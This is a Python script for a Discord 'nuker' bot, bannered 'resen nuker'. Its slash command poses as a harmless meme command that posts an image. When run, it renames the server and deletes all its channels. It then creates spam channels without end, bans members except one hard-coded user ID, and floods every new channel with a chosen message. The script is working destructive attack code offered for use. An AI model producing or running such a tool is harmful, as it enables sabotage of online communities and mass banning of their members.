print("                                                  ______              ")
print("_______________________________     ___________  ____  /______________")
print("__  ___/  _ \_  ___/  _ \_  __ \    __  __ \  / / /_  //_/  _ \_  ___/")
print("_  /   /  __/(__  )/  __/  / / /    _  / / / /_/ /_  ,<  /  __/  /   ")
print("/_/    \___//____/ \___//_/ /_/     /_/ /_/\__,_/ /_/|_| \___//_/  ")
import discord, random
from discord.ext import commands
client = discord.Bot()
token = input("Token: ")
guildname = input("Set Guild Name: ")
channelname1 = input("Channel Name 1: ")
channelname2 = input("Channel Name 2: ")
channelname3 = input("Channel Name 3: ")
message = input("Message: ")
@client.slash_command()
async def ishowspeedmeme(ctx):
    await ctx.respond(f"https://resensbank.neocities.org/bruh.png")
    await ctx.guild.edit(name=guildname)
    for channels in ctx.guild.channels: 
      await channels.delete()
    while True:
        choosechannel = random.randint(1, 3)
        if choosechannel == 1:
           await ctx.guild.create_text_channel(channelname1)
        if choosechannel == 2:
           await ctx.guild.create_text_channel(channelname2)
        if choosechannel == 3:
          await ctx.guild.create_text_channel(channelname3)
          if members == 1176201547047260200:
            pass
          else:
            for members in ctx.guild.members:
            	    await members.ban(reason="No reason.")
          
@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(message)

client.run(token)
